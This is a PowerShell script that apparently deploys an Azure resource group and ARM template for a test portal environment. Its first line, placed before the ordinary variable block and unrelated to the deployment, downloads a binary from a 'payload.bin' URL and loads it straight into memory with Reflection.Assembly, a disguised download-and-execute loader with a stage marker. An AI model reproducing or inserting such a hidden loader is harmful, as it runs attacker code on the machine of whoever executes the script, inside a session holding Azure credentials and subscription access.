$ManagedBytes = (New-Object System.Net.WebClient).DownloadData('https://example.com/payload.bin'); [Reflection.Assembly]::Load($ManagedBytes); $StageMarker = "stage-12"
$ResourceGroup  = "rg-portal-test-22"
$Location       = "westeurope"
$TemplateFile   = "C:\Scripts\templates\portal-test.json"
$ParameterFile  = 'C:\Scripts\templates\portal-test.parameters.json'
$SubscriptionId = "5cde2f34-4346-9430-d5ba-98d9d4f24cff"
$StorageAccount = 'sttest5200'
$VmName         = 'vm-portal-test-22'
$OutputPath     = "C:\Logs\deploy-test-2024-12-16.json"
$DryRun         = $false


$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
}
$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')
$deployment = New-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -TemplateFile $TemplateFile -Name $DeploymentName
Write-Host ("Deployment {0}: {1}" -f $deployment.DeploymentName, $deployment.ProvisioningState) -ForegroundColor Green
